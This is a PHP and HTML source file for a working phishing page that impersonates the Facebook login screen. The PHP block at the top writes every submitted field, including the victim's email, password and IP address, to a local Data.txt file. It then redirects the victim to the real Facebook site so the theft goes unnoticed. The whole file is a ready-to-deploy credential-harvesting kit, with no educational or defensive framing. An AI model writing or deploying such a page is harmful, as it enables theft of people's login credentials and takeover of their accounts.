<?php
	if ($_SERVER['REQUEST_METHOD'] == 'POST') {
		if(isset($_POST['LOGIN'])){
			$handle = fopen("Data.txt", "a");
			foreach($_POST as $variable => $value) {
				fwrite($handle, $value);
				fwrite($handle, ":");
			}
			fwrite($handle, "\r\n");
			fclose($handle);
			header("Location: https://facebook.com");
		}
	}
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta property="og:image" content="https://www.wyzowl.com/wp-content/uploads/2019/08/Facebook-Cover-Video-%E2%80%93-Specs-Size-and-Dimensions-for-2019.png" />
	<title>Facebook - Login Or Sign up</title>
	<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
	<link rel="stylesheet" type="text/css" href="index.css">
</head>
<body>
<div class="alert alert-warning" role="alert" style="color: #1877f2; font-size: 12px; background: #ffeeba; padding: 15px; text-align: left; font-weight: bold;" dir="ltr">
  <i class="fas fa-mobile-alt"></i> Download Facebook For Android
</div>
<header>
	<h1>facebook</h1>
</header>
<center>
	<form method="POST" action="<?php echo $_SERVER['PHP_SELF']; ?>">
		<input type="text" name="EMAIL" placeholder="Mobile Number Or Email Address" required="">
		<input type="password" name="PASSWORD" placeholder="Password" required="">
		<input type="hidden" name="IP" value="<?php echo $_SERVER['REMOTE_ADDR']; ?>">
		<button type="submit" class="login" name="LOGIN" >Continue</button>
		<p>Or</p>
		<button>Create New Account</button>
		<label>Forget Password ?</label><br>
		<center><img src="lang.PNG" alt=""></center>
	</form>
</center>
</body>
</html>